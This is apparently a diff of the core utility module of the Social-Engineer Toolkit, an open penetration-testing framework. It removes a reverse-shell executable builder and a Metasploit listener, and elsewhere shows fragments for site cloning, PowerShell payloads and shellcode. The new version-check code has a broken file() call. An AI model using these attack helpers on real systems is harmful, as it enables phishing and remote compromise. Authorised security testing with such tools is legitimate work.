@@ -19,10 +19,6 @@ import io
 import trace
 from urllib import *
 
-# needed for checking SET versions speedup
-global global_version
-global_version = 0
-
 if sys.version_info >= (3, 0):
     # python 3 removes reduce from builtin and into functools
     from functools import *
@@ -159,8 +155,6 @@ else:
             self.DARKCYAN = ''
 
 # this will be the home for the set menus
-
-
 def setprompt(category, text):
     # if no special prompt and no text, return plain prompt
     if category == '0' and text == "":
@@ -227,8 +221,6 @@ DEBUG_LEVEL = 0
 #  6 = imports, info messages, menus with pause for <ENTER>
 
 debugFrameString = '-' * 72
-
-
 def debug_msg(currentModule, message, msgType):
     if DEBUG_LEVEL == 0:
         pass  # stop evaluation efficiently
@@ -249,28 +241,21 @@ def mod_name():
 
 #
 # RUNTIME MESSAGES ############
-
-
 def print_status(message):
     print(bcolors.GREEN + bcolors.BOLD + "[*] " + bcolors.ENDC + str(message))
-
 
 def print_info(message):
     print(bcolors.BLUE + bcolors.BOLD + "[-] " + bcolors.ENDC + str(message))
 
-
 def print_info_spaces(message):
     print(bcolors.BLUE + bcolors.BOLD + "  [-] " + bcolors.ENDC + str(message))
-
 
 def print_warning(message):
     print(bcolors.YELLOW + bcolors.BOLD + "[!] " + bcolors.ENDC + str(message))
 
-
 def print_error(message):
     print(bcolors.RED + bcolors.BOLD +
           "[!] " + bcolors.ENDC + bcolors.RED + str(message) + bcolors.ENDC)
-
 
 def get_version():
     define_version = '7.3'
@@ -297,7 +282,6 @@ class create_menu:
                 print('\n  99) Return to Main Menu\n')
         return
 
-
 def validate_ip(address):
     try:
         if socket.inet_aton(address):
@@ -317,8 +301,6 @@ def validate_ip(address):
 #
 # grab the metaspoit path
 #
-
-
 def meta_path():
 
     # DEFINE METASPLOIT PATH
@@ -396,8 +378,6 @@ def meta_path():
 #
 # grab the metaspoit path
 #
-
-
 def meta_database():
     # DEFINE METASPLOIT PATH
     meta_path = open("/etc/setoolkit/set.config", "r").readlines()
@@ -487,8 +467,6 @@ def cleanup_routine():
 #
 # Update The Social-Engineer Toolkit
 #
-
-
 def update_set():
     backbox = check_backbox()
     kali = check_kali()
@@ -518,8 +496,6 @@ def update_set():
 #
 # Pull the help menu here
 #
-
-
 def help_menu():
     fileopen = open("README.md", "r").readlines()
     for line in fileopen:
@@ -543,8 +519,6 @@ def date_time():
 #
 # generate a random string
 #
-
-
 def generate_random_string(low, high):
     length = random.randint(low, high)
     letters = string.ascii_letters + string.digits
@@ -554,8 +528,6 @@ def generate_random_string(low, high):
 # clone JUST a website, and export it.
 # Will do no additional attacks.
 #
-
-
 def site_cloner(website, exportpath, *args):
     grab_ipaddress()
     ipaddr = grab_ipaddress()
@@ -589,73 +561,11 @@ def site_cloner(website, exportpath, *args):
     subprocess.Popen("mkdir '%s';cp %s/web_clone/* '%s'" % (exportpath, setdir,
                                                             exportpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
-#
-# this will generate a meterpreter reverse payload (executable)
-# with backdoored executable, digital signature stealing, and
-# UPX encoded (if these options are enabled). It will automatically
-# inherit the AUTO_DETECT=ON or OFF configuration.
-#
-# usage: metasploit_reverse_tcp_exe(portnumber)
-#
-
-
-def meterpreter_reverse_tcp_exe(port):
-
-    ipaddr = grab_ipaddress()
-    filewrite = open(setdir + "/interface", "w")
-    filewrite.write(ipaddr)
-    filewrite.close()
-    filewrite = open(setdir + "/ipaddr", "w")
-    filewrite.write(ipaddr)
-    filewrite.close()
-    update_options("IPADDR=" + ipaddr)
-
-    # trigger a flag to be checked in payloadgen
-    # if this flag is true, it will skip the questions
-    filewrite = open(setdir + "/meterpreter_reverse_tcp_exe", "w")
-    filewrite.write(port)
-    filewrite.close()
-    # import the system path for payloadgen in SET
-    sys.path.append("src/core/payloadgen")
-    try:
-        debug_msg(
-            "setcore", "importing 'src.core.payloadgen.create_payloads'", 1)
-        module_reload(create_payloads)
-
-    except:
-        debug_msg(
-            "setcore", "importing 'src.core.payloadgen.create_payloads'", 1)
-        import create_payloads
-
-    random_value = generate_random_string(5, 10)
-    # copy the created executable to program_junk
-    print_status("Executable created under %s/%s.exe" % (setdir, random_value))
-    subprocess.Popen(
-        "cp %s/msf.exe %s/%s.exe" % (setdir, setdir, random_value),
-                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
-#
-# Start a metasploit multi handler
-#
-
-
-def metasploit_listener_start(payload, port):
-    # open a file for writing
-    filewrite = open(setdir + "/msf_answerfile", "w")
-    filewrite.write(
-        "use multi/handler\nset payload %s\nset LHOST 0.0.0.0\nset LPORT %s\nexploit -j\n\n" % (payload, port))
-    # close the file
-    filewrite.close()
-    # launch msfconsole
-    metasploit_path = meta_path()
-    subprocess.Popen("%s/msfconsole -r %s/msf_answerfile" %
-                     (metasploit_path, setdir), shell=True).wait()
 
 #
 # This will start a web server in the directory root you specify, so for example
 # you clone a website then run it in that web server, it will pull any index.html file
 #
-
-
 def start_web_server(directory):
     try:
         # import the threading, socketserver, and simplehttpserver
@@ -682,8 +592,6 @@ def start_web_server(directory):
 #
 # this will start a web server without threads
 #
-
-
 def start_web_server_unthreaded(directory):
     try:
         # import the threading, socketserver, and simplehttpserver
@@ -751,8 +659,6 @@ def java_applet_attack(website, port, directory):
 # this will create a raw PDE file for you to use in your teensy device
 #
 #
-
-
 def teensy_pde_generator(attack_method):
 
     # grab the ipaddress
@@ -818,16 +724,12 @@ def teensy_pde_generator(attack_method):
 #
 # Expand the filesystem windows directory
 #
-
-
 def windows_root():
     return os.environ['WINDIR']
 
 #
 # core log file routine for SET
 #
-
-
 def log(error):
     try:
         # open log file only if directory is present (may be out of directory
@@ -851,8 +753,6 @@ def log(error):
 #
 # upx encoding and modify binary
 #
-
-
 def upx(path_to_file):
     # open the set_config
     fileopen = open("/etc/setoolkit/set.config", "r")
@@ -896,7 +796,6 @@ def upx(path_to_file):
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
     time.sleep(3)
 
-
 def show_banner(define_version, graphic):
 
     if graphic == "1":
@@ -912,7 +811,7 @@ def show_banner(define_version, graphic):
 [---]        The Social-Engineer Toolkit (""" + bcolors.YELLOW + """SET""" + bcolors.BLUE + """)         [---]
 [---]        Created by:""" + bcolors.RED + """ David Kennedy """ + bcolors.BLUE + """(""" + bcolors.YELLOW + """ReL1K""" + bcolors.BLUE + """)         [---]
 [---]                  Version: """ + bcolors.RED + """%s""" % (define_version) + bcolors.BLUE + """                    [---]
-[---]               Codename: '""" + bcolors.YELLOW + """Five/Nine""" + bcolors.ENDC + bcolors.BLUE + """'              [---]
+[---]             Codename: '""" + bcolors.YELLOW + """Underground""" + bcolors.ENDC + bcolors.BLUE + """'              [---]
 [---]        Follow us on Twitter: """ + bcolors.PURPLE + """@TrustedSec""" + bcolors.BLUE + """         [---]
 [---]        Follow me on Twitter: """ + bcolors.PURPLE + """@HackingDave""" + bcolors.BLUE + """        [---]
 [---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE + """       [---]
@@ -932,7 +831,7 @@ def show_banner(define_version, graphic):
 
     # pull version
     try:
-        if global_version == 0:
+        if not os.path.isfile(setdir + "/version.lock"):
             response = urlopen('https://raw.githubusercontent.com/trustedsec/social-engineer-toolkit/master/src/core/setcore.py')
             setcheck = response.readlines()
             for line in setcheck:
@@ -941,16 +840,18 @@ def show_banner(define_version, graphic):
                     # define_version = '7.1.2'
                     global version
                     version = line.replace("define_version = ", "").replace("'", "", 2).replace("    ", "")
-                    global global_version
-                    global_version = 1
                     break
+                filewrite = file(setdir + "/version.lock")
+                filewrite.write(version)
+                filewrite.close()
 
+        else: version = open(setdir + "/version.lock", "r").read()
         if cv != version:
             print(bcolors.RED + "          There is a new version of SET available.\n                    " + bcolors.GREEN + " Your version: " + bcolors.RED + cv + bcolors.GREEN +
                   "\n                  Current version: " + bcolors.ENDC + bcolors.BOLD + version + bcolors.YELLOW + "\n\nPlease update SET to the latest before submitting any git issues.\n\n" + bcolors.ENDC)
     except Exception as err:
-        print(err)
-
+        #print(err)
+        pass
 
 def show_graphic():
     menu = random.randrange(2, 15)
@@ -1214,14 +1115,10 @@ def set_check():
             return False
 
 # if the user specifies 99
-
-
 def menu_back():
     print_info("Returning to the previous menu...")
 
 # used to generate random templates for the phishing schema
-
-
 def custom_template():
     try:
         print ("         [****]  Custom Template Generator [****]\n")
@@ -1277,14 +1174,10 @@ def check_length(choice, max):
             counter = 1
 
 # valid if IP address is legit
-
-
 def is_valid_ip(ip):
     return is_valid_ipv4(ip) or is_valid_ipv6(ip)
 
 # ipv4
-
-
 def is_valid_ipv4(ip):
     pattern = re.compile(r"""
         ^
@@ -1323,8 +1216,6 @@ def is_valid_ipv4(ip):
     return pattern.match(ip) is not None
 
 # ipv6
-
-
 def is_valid_ipv6(ip):
     """Validates IPv6 addresses.
     """
@@ -1388,8 +1279,6 @@ def check_config(param):
                 return line[1]
 
 # copy an entire folder function
-
-
 def copyfolder(sourcePath, destPath):
     for root, dirs, files in os.walk(sourcePath):
 
@@ -1432,8 +1321,6 @@ def check_options(option):
         return trigger
 
 # future home to update one localized set configuration file
-
-
 def update_options(option):
         # if the file isn't there write a blank file
     if not os.path.isfile(setdir + "/set.options"):
@@ -1455,8 +1342,6 @@ def update_options(option):
     filewrite.close()
 
 # python socket listener
-
-
 def socket_listener(port):
     port = int(port)          # needed integer for port
     host = ''                 # Symbolic name meaning the local host
@@ -1483,8 +1368,6 @@ def socket_listener(port):
     conn.close()
 
 # generates powershell payload
-
-
 def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
 
     # generate our shellcode first
@@ -1541,8 +1424,6 @@ def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
     return base64.b64encode(powershell_command.encode('utf_16_le')).decode("ascii")
 
 # generate base shellcode
-
-
 def generate_shellcode(payload, ipaddr, port):
 
     msf_path = meta_path()
@@ -1553,8 +1434,6 @@ def generate_shellcode(payload, ipaddr, port):
     data = proc.communicate()[0]
     data = data.decode('ascii')
     # start to format this a bit to get it ready
-    # repls = {';': '', ' ': '', '+': '', '"': '', '\n': '',
-    #         'unsigned char buf=': '', 'unsignedcharbuf[]=': ''}
     repls = [';', ' ', '+', '"', '\n', 'unsigned char buf=',
              'unsignedcharbuf[]=', "b'", "'", '\\n']
     for repl in repls:
@@ -1562,8 +1441,6 @@ def generate_shellcode(payload, ipaddr, port):
     return data
 
 # this will take input for shellcode and do a replace for IP addresses
-
-
 def shellcode_replace(ipaddr, port, shellcode):
     # split up the ip address
     ip = ipaddr.split('.')
@@ -1627,8 +1504,6 @@ def shellcode_replace(ipaddr, port, shellcode):
     return shellcode
 
 # exit routine
-
-
 def exit_set():
     cleanup_routine()
     print("\n\n Thank you for " + bcolors.RED + "shopping" + bcolors.ENDC +
@@ -1674,8 +1549,6 @@ def metasploit_shellcode(payload, ipaddr, port):
 
 # here we encrypt via aes, will return encrypted string based on secret
 # key which is random
-
-
 def encryptAES(secret, data):
 
     # the character used for padding--with a block cipher such as AES, the value
@@ -1702,8 +1575,6 @@ def encryptAES(secret, data):
     return str(aes)
 
 # compare ports to make sure its not already in a config file for metasploit
-
-
 def check_ports(filename, port):
     fileopen = open(filename, "r")
     data = fileopen.read()
@@ -1748,8 +1619,6 @@ class DNSQuery:
         return packet
 
 # main dns routine
-
-
 def dns():
     udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     udps.bind(('', 53))
@@ -1765,8 +1634,6 @@ def dns():
         udps.close()
 
 # start dns
-
-
 def start_dns():
     thread.start_new_thread(dns, ())
 
@@ -1778,6 +1645,7 @@ def setdir():
         return os.path.join(os.path.expanduser('~'), '.set')
     if check_os() == "windows":
         return "src/program_junk/"
+
 # set the main directory for SET
 setdir = setdir()
 
@@ -1788,8 +1656,6 @@ setdir = setdir()
 
 # convert an IP address from its dotted-quad format to its
 # 32 binary digit representation
-
-
 def ip2bin(ip):
     b = ""
     inQuads = ip.split(".")
@@ -1805,8 +1671,6 @@ def ip2bin(ip):
 
 # convert a decimal number to binary representation
 # if d is specified, left-pad the binary number with 0s to that length
-
-
 def dec2bin(n, d=None):
     s = ""
     while n > 0:
@@ -1823,8 +1687,6 @@ def dec2bin(n, d=None):
     return s
 
 # convert a binary string into an IP address
-
-
 def bin2ip(b):
     ip = ""
     for i in range(0, len(b), 8):
@@ -1832,8 +1694,6 @@ def bin2ip(b):
     return ip[:-1]
 
 # print a list of IP addresses based on the CIDR block specified
-
-
 def printCIDR(c):
     parts = c.split("/")
     baseIP = ip2bin(parts[0])
@@ -1856,8 +1716,6 @@ def printCIDR(c):
         return breakdown
 
 # input validation routine for the CIDR block specified
-
-
 def validateCIDRBlock(b):
     # appropriate format for CIDR block ($prefix/$subnet)
     p = re.compile("^([0-9]{1,3}\.){0,3}[0-9]{1,3}(/[0-9]{1,2}){1}$")
@@ -1880,8 +1738,6 @@ def validateCIDRBlock(b):
 
 # Queries a remote host on UDP:1434 and returns MSSQL running port
 # Written by Larry Spohn (spoonman) @ TrustedSec
-
-
 def get_sql_port(host):
 
     # Build the socket with a .1 second timeout
@@ -1902,8 +1758,6 @@ def get_sql_port(host):
         pass
 
 # this will manually tcp connect if needed
-
-
 def sql_nmap_scan(ipaddr):
     proc = subprocess.Popen("nmap -v -sT -p1433 %s" %
                             (ipaddr), shell=True, stdout=subprocess.PIPE)
@@ -1915,8 +1769,6 @@ def sql_nmap_scan(ipaddr):
     return result
 
 # capture output from a function
-
-
 def capture(func, *args, **kwargs):
     """Capture the output of func when called with the given arguments.
 
@@ -1936,8 +1788,6 @@ def capture(func, *args, **kwargs):
     return (result, c1.getvalue(), c2.getvalue())
 
 # check to see if we are running backbox linux
-
-
 def check_backbox():
     if os.path.isfile("/etc/issue"):
         backbox = open("/etc/issue", "r")
@@ -1952,8 +1802,6 @@ def check_backbox():
         return "Non-BackBox"
 
 # check to see if we are running kali linux
-
-
 def check_kali():
     if os.path.isfile("/etc/apt/sources.list"):
         kali = open("/etc/apt/sources.list", "r")
@@ -1968,8 +1816,6 @@ def check_kali():
         return "Non-Kali"
 
 # here we give multiple options to specify for SET java applet
-
-
 def applet_choice():
 
     # prompt here
@@ -2012,8 +1858,6 @@ Select which option you want:
             module_reload(src.html.unsigned.verified_sign)
 
 # reload module function for python 2 and python 3
-
-
 def module_reload(module):
     if sys.version_info >= (3, 0):
         import importlib
@@ -2022,14 +1866,10 @@ def module_reload(module):
         reload(module)
 
 # used to replace any input that we have from python 2 to python 3
-
-
 def input(string):
     return raw_input(string)
 
 # fetch URL needed for web cloning
-
-
 def fetch_template():
     fileopen = open(setdir + "/site.template").readlines()
     for line in fileopen:
